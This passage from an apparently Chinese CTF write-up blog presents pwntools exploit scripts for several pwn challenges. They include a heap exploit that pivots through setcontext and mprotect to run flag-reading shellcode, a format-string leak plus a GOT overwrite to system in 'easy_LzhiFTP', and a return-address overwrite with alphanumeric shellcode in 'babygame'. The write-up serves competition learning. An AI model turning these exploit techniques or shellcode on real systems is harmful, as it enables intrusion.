class="line">r.sendlineafter(<span class="string">':'</span>, <span class="built_in">str</span>(pd))</span><br><span class="line"></span><br><span class="line">r.sendlineafter(menu, <span class="string">'add'</span>)</span><br><span class="line">r.sendlineafter(<span class="string">'size?\n'</span>, <span class="built_in">str</span>(<span class="number">0x510</span>))</span><br><span class="line">r.sendlineafter(<span class="string">'mode?\n'</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">r.send(<span class="string">'a'</span> * <span class="number">8</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">2</span>, <span class="string">'a'</span> * <span class="number">8</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">2</span>, <span class="string">'a'</span> * <span class="number">8</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">2</span>, <span class="string">'a'</span> * <span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x4f0</span>, <span class="number">3</span>, <span class="string">'a'</span> * <span class="number">8</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">2</span>, <span class="string">'a'</span> * <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x510</span>, <span class="number">3</span>, <span class="string">'a'</span> * <span class="number">7</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">malloc_hook = u64(r.recvuntil(<span class="string">'\x7f'</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>)) - <span class="number">96</span> - <span class="number">0x10</span></span><br><span class="line">li(<span class="string">'malloc_hook = '</span> + <span class="built_in">hex</span>(malloc_hook))</span><br><span class="line"></span><br><span class="line"><span class="comment">#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')</span></span><br><span class="line">libc = ELF(<span class="string">'libc-2.31.so'</span>)</span><br><span class="line">libc_base = malloc_hook - libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">li(<span class="string">'libc_base = '</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line">li(<span class="string">'free_hook = '</span> + <span class="built_in">hex</span>(free_hook))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">2</span>, <span class="string">''</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">heap_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>)) - <span class="number">0x4da</span></span><br><span class="line">li(<span class="string">'heap_base = '</span> + <span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p1 = p64(heap_base + <span class="number">0x530</span>) + <span class="number">0xf8</span> * <span class="string">b'a'</span> + p64(<span class="number">0x210</span>)</span><br><span class="line">add(<span class="number">0x108</span>, <span class="number">1</span>, p1)</span><br><span class="line"></span><br><span class="line">p2 = p64(<span class="number">0</span>) + p64(<span class="number">0x211</span>) + p64(heap_base + <span class="number">0x640</span> - <span class="number">0x18</span>) + p64(heap_base + <span class="number">0x640</span> - <span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">2</span>, p2)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p3 = <span class="string">b'\x00'</span> * <span class="number">0xf8</span> + p64(<span class="number">0x111</span>) + p64(free_hook)</span><br><span class="line">add(<span class="number">0x500</span>, <span class="number">3</span>, p3)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">2</span>, <span class="string">''</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gadget = 0x151990 + libc_base</span></span><br><span class="line">gadget = <span class="number">0x00000000001518b0</span> + libc_base</span><br><span class="line">add(<span class="number">0</span>, <span class="number">2</span>, p64(gadget))</span><br><span class="line">heap_first = heap_base + <span class="number">0xd60</span></span><br><span class="line">setcontext = libc.sym[<span class="string">'setcontext'</span>] + <span class="number">61</span> + libc_base</span><br><span class="line">mprotect_addr = libc.sym[<span class="string">'mprotect'</span>] + libc_base</span><br><span class="line"></span><br><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">'./flag'</span>, <span class="number">0</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="number">3</span>, heap_first + <span class="number">0x200</span>, <span class="number">0x100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>, heap_first + <span class="number">0x200</span>, <span class="number">0x100</span>)</span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line"></span><br><span class="line">p1 = p64(heap_first + <span class="number">0x100</span>) + p64(heap_first)</span><br><span class="line">p1 = p1.ljust(<span class="number">0x20</span>, <span class="string">b'\x00'</span>) + p64(setcontext)</span><br><span class="line">p1 = p1.ljust(<span class="number">0x68</span>, <span class="string">b'\x00'</span>) + p64(heap_base - <span class="number">0xb230</span>)</span><br><span class="line">p1 = p1.ljust(<span class="number">0x70</span>, <span class="string">b'\x00'</span>) + p64(<span class="number">0x21000</span>)</span><br><span class="line">p1 = p1.ljust(<span class="number">0x88</span>, <span class="string">b'\x00'</span>) + p64(<span class="number">7</span>)</span><br><span class="line">p1 = p1.ljust(<span class="number">0xa0</span>, <span class="string">b'\x00'</span>) + p64(heap_first)</span><br><span class="line">p1 = p1.ljust(<span class="number">0xa8</span>, <span class="string">b'\x00'</span>) + p64(mprotect_addr)</span><br><span class="line">p1 = p1.ljust(<span class="number">0x100</span>, <span class="string">b'\x00'</span>) + shellcode</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x500</span>, <span class="number">3</span>, p1)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure><h2 id="easy-LzhiFTP-CHELL"><a href="#easy-LzhiFTP-CHELL" class="headerlink" title="easy_LzhiFTP_CHELL"></a>easy_LzhiFTP_CHELL</h2><p>这里就是多了一次touch，导致可以覆盖下面chunk地址</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(opcode, <span class="string">"touch"</span>, <span class="number">5uLL</span>) &amp;&amp; file_flags &lt;= <span class="number">16</span> &amp;&amp; <span class="built_in">strlen</span>(opcode) &gt; <span class="number">6</span> )</span><br></pre></td></tr></tbody></table></figure><p>然后利用这一次touch，打chunk的地址到puts_got，然后edit打got到system_plt即可</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./easy_LzhiFTP'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">'39.106.131.193'</span>, <span class="number">22639</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbgg</span>():</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line">raw_input()</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">'Username: '</span>, <span class="string">'z1r0'</span>)</span><br><span class="line">r.sendlineafter(<span class="string">'Input Password: '</span>, p64(<span class="number">0x0000000a00000072</span>))</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">'do you like my Server??(yes/No)'</span>, <span class="string">'yes%6$p'</span>)</span><br><span class="line"></span><br><span class="line">menu = <span class="string">'IMLZH1-FTP&gt; '</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">touch</span>(<span class="params">file_name, content</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'touch '</span> + file_name)</span><br><span class="line">    r.sendafter(<span class="string">'write Context:'</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'edit'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'idx:'</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    r.sendafter(<span class="string">'Content: '</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'del'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'idx:'</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">leak_addr = <span class="built_in">int</span>(r.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">li(<span class="string">'leak_addr = '</span> + <span class="built_in">hex</span>(leak_addr))</span><br><span class="line"></span><br><span class="line">elf_base = leak_addr - <span class="number">0x2096</span></span><br><span class="line">li(<span class="string">'elf_base = '</span> + <span class="built_in">hex</span>(elf_base))</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>] + elf_base</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    touch(<span class="string">'/bin/sh\x00'</span>, <span class="string">'z1r0'</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">r.sendlineafter(menu, <span class="string">b'touch '</span> + p64(puts_got))</span><br><span class="line">r.sendafter(<span class="string">'write Context:'</span>, <span class="string">'z1r0'</span>)</span><br><span class="line"></span><br><span class="line">system_plt = elf_base + elf.plt[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, p64(system_plt))</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">'ls'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure><h2 id="babygame"><a href="#babygame" class="headerlink" title="babygame"></a>babygame</h2><p>漏洞点在sub_401511这函数里</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_401511</span><span class="params">(<span class="type">char</span> *a1)</span></span><br><span class="line">{</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+14h] [rbp-3Ch]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+18h] [rbp-38h]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+1Ch] [rbp-34h]</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">40</span>]; <span class="comment">// [rsp+20h] [rbp-30h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  *a1 = <span class="built_in">toupper</span>(*a1);</span><br><span class="line">  <span class="keyword">if</span> ( *a1 &lt;= <span class="string">'@'</span> || *a1 &gt; <span class="string">'M'</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  v2 = sub_4014BC(a1[<span class="number">1</span>]);</span><br><span class="line">  v3 = sub_4014BC(a1[<span class="number">2</span>]);</span><br><span class="line">  v4 = sub_4014BC(a1[<span class="number">3</span>]);</span><br><span class="line">  result = (<span class="type">unsigned</span> <span class="type">int</span>)(*a1 - <span class="number">65</span>);</span><br><span class="line">  <span class="keyword">switch</span> ( *a1 )</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'A'</span>:</span><br><span class="line">      result = v2;</span><br><span class="line">      v5[v2] = v4;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'B'</span>:</span><br><span class="line">      result = v2;</span><br><span class="line">      v5[v2] = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'C'</span>:</span><br><span class="line">      result = *(_QWORD *)&amp;v5[v4 + <span class="number">0x10</span>];</span><br><span class="line">      *(_QWORD *)&amp;v5[v2] = result;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'D'</span>:</span><br><span class="line">      result = v4;</span><br><span class="line">      v5[v4 + <span class="number">16</span>] = v5[v2];</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'E'</span>:</span><br><span class="line">      result = v2;</span><br><span class="line">      v5[v2] = v5[v3] + v5[v4];</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'F'</span>:</span><br><span class="line">      result = v2;</span><br><span class="line">      v5[v2] = v5[v3] - v5[v4];</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'G'</span>:</span><br><span class="line">      result = v2;</span><br><span class="line">      v5[v2] = v5[v4] &amp; v5[v3];</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'H'</span>:</span><br><span class="line">      result = v2;</span><br><span class="line">      v5[v2] = v5[v4] | v5[v3];</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'I'</span>:</span><br><span class="line">      result = v2;</span><br><span class="line">      v5[v2] = v5[v4] ^ v5[v3];</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'J'</span>:</span><br><span class="line">      result = v2;</span><br><span class="line">      v5[v2] = <span class="number">2</span> * v5[v3];</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'K'</span>:</span><br><span class="line">      result = v2;</span><br><span class="line">      v5[v2] = v5[v3] &gt;&gt; <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>可以控制<code>v2 v3 v4</code>，并且有一块具有rwx的地址，可以覆盖到这个函数的返回地址</p><p>所以可以把那一个rwx地址写到v5里，然后利用C，把rwx的地址直接写到这个函数的返回地址</p><p>在进行漏洞之前还需要<code>expansion backpack</code>一下<code>backpack_size</code>，这样子我们就可以借助<code>Purchase props</code>来写很多的数据到rwx那里，shellcode直接用的可见字符</p><p>这里比较烦的是md5这一部分，这里笔者借助了一个api，<code>https://md5decrypt.net/Api/api.php?hash=' + hash + '&amp;hash_type=md5&amp;email=xxxx@qq.com&amp;code=xxxxx'</code>，去注册一下，邮箱里会得到code，填上去即可使用</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pyquery <span class="keyword">import</span> PyQuery <span class="keyword">as</span> pq</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./pwn'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + <span class="built_in">str</span>(x) + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + <span class="built_in">str</span>(x) + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'splitw'</span>,<span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">'47.93.6.210'</span>, <span class="number">41031</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbgg</span>():</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">a</span>):</span><br><span class="line">    url=<span class="string">'https://www.cmd5.com/'</span></span><br><span class="line">    request=requests.session()</span><br><span class="line">    html_code=request.post(url).text</span><br><span class="line">    doc=pq(html_code)</span><br><span class="line">    viewstart=doc(<span class="string">'#__VIEWSTATE'</span>).attr.value</span><br><span class="line">    VIEWSTATEGENERATOR=doc(<span class="string">'#__VIEWSTATEGENERATOR'</span>).attr.value</span><br><span class="line">    ContentPlaceHolder1_HiddenField2=doc(<span class="string">'#ctl00_ContentPlaceHolder1_HiddenField2'</span>).attr.value</span><br><span class="line"></span><br><span class="line">    data={</span><br><span class="line">        <span class="string">'__EVENTTARGET'</span>:<span class="string">'Button1'</span>,</span><br><span class="line">        <span class="string">'__EVENTARGUMENT'</span>:<span class="string">''</span>,</span><br><span class="line">        <span class="string">'__VIEWSTATE'</span>:viewstart,</span><br><span class="line">        <span class="string">'__VIEWSTATEGENERATOR'</span>:VIEWSTATEGENERATOR,</span><br><span class="line">        <span class="comment">#输入加密参数</span></span><br><span class="line">        <span class="string">'ctl00$ContentPlaceHolder1$TextBoxInput'</span>:a,</span><br><span class="line">        <span class="comment">#类型   这个类型可以改成别的 如加密参数书 base64 就改成base64</span></span><br><span class="line">        <span class="string">'ctl00$ContentPlaceHolder1$InputHashType'</span>:<span class="string">'md5'</span>,</span><br><span class="line">        <span class="string">'ctl00$ContentPlaceHolder1$Button1'</span>:<span class="string">'查询'</span>,</span><br><span class="line">        <span class="string">'ctl00$ContentPlaceHolder1$HiddenFieldAliCode'</span>:<span class="string">''</span>,</span><br><span class="line">        <span class="string">'ctl00$ContentPlaceHolder1$HiddenField1'</span>:<span class="string">''</span>,</span><br><span class="line">        <span class="string">'ctl00$ContentPlaceHolder1$HiddenField2'</span>:ContentPlaceHolder1_HiddenField2</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    headers={</span><br><span class="line">        <span class="string">'referer'</span>:<span class="string">'https://www.cmd5.com/'</span></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    request_cmd5=request.post(url,data=data,headers=headers).text</span><br><span class="line">    two_doc=pq(request_cmd5)</span><br><span class="line">    Decrypt=two_doc(<span class="string">'#LabelAnswer'</span>).text()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Decrypt</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5dec</span>(<span class="params"><span class="built_in">hash</span></span>):</span><br><span class="line">    url = <span class="string">'https://md5decrypt.net/Api/api.php?hash='</span> + <span class="built_in">hash</span> + <span class="string">'&amp;hash_type=md5&amp;email=xxx@qq.com&amp;code=xxxxx'</span></span><br><span class="line">    response = requests.get(url)</span><br><span class="line">    <span class="keyword">return</span> response.text</span><br><span class="line"></span><br><span class="line">menu = <span class="string">'&gt;&gt; '</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">play_game</span>(<span class="params">num</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'1'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Please enter your level : '</span>, <span class="string">'4'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">        r.recvuntil(<span class="string">' == '</span>)</span><br><span class="line">        md5_enc = <span class="built_in">int</span>(r.recvuntil(<span class="string">'\n'</span>), <span class="number">16</span>)</span><br><span class="line">        <span class="comment">#li(hex(md5_enc)[2:])</span></span><br><span class="line">        md5_enc = <span class="built_in">hex</span>(md5_enc)[<span class="number">2</span>:]</span><br><span class="line">        md5_dec = md5dec(md5_enc)</span><br><span class="line">        li(md5_dec)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(md5_dec) &lt; <span class="number">0</span> <span class="keyword">or</span> <span class="built_in">len</span>(md5_dec) &gt; <span class="number">6</span>:</span><br><span class="line">            r.sendlineafter(<span class="string">'Give me : '</span>, <span class="string">'a'</span>)</span><br><span class="line">            r.sendlineafter(menu, <span class="string">'1'</span>)</span><br><span class="line">            r.sendlineafter(<span class="string">'Please enter your level : '</span>, <span class="string">'4'</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        r.sendlineafter(<span class="string">'Give me : '</span>, <span class="built_in">str</span>(md5_dec))</span><br><span class="line">    r.sendlineafter(<span class="string">'Give me : '</span>, <span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backpack</span>(<span class="params">size</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'2'</span>)</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'2'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'What size do you need : '</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">purchase_props</span>(<span class="params">content</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'2'</span>)</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'1'</span>)</span><br><span class="line">    r.sendafter(<span class="string">'Enter the letter you want to purchase'</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">using_props</span>():</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'2'</span>)</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line">play_game(<span class="number">30</span>)</span><br><span class="line">backpack(<span class="number">0x100</span>)</span><br><span class="line"><span class="comment">#shellcode = asm(shellcraft.sh())</span></span><br><span class="line">shellcode = <span class="string">'Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t'</span></span><br><span class="line">purchase_props(<span class="string">'AG0GAH00AI02Co00'</span> + shellcode)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure><h2 id="sigin-shellcode"><a href="#sigin-shellcode" 